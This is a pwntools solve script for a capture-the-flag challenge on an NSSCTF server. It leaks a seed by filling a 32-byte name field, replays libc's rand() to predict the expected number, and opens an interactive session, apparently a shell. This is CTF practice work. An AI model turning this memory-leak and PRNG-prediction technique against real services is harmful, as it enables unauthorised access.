from pwn import *
from ctypes import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=process("./pwn")
io=remote("node1.anna.nssctf.cn",28695)
elf=ELF("./pwn")
cs=cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")

io.sendafter(b"name: ",b"a"*0x20)
io.sendafter(b"word: ",b"ls_4nyth1n9_7ruIy_R4nd0m?")

io.recvuntil(b"a"*0x20)
seed=u64(io.recv(4).ljust(8,b"\x00"))
print("seed: ",hex(seed))
cs.srand(seed)
v3=cs.rand()
v4=cs.rand()^v3
v5=cs.rand()
cs.srand(v4^v5)
cs.rand()
cs.rand()
cs.rand()
v8=cs.rand()

io.sendlineafter(b"now.\n",str(v8))

io.interactive()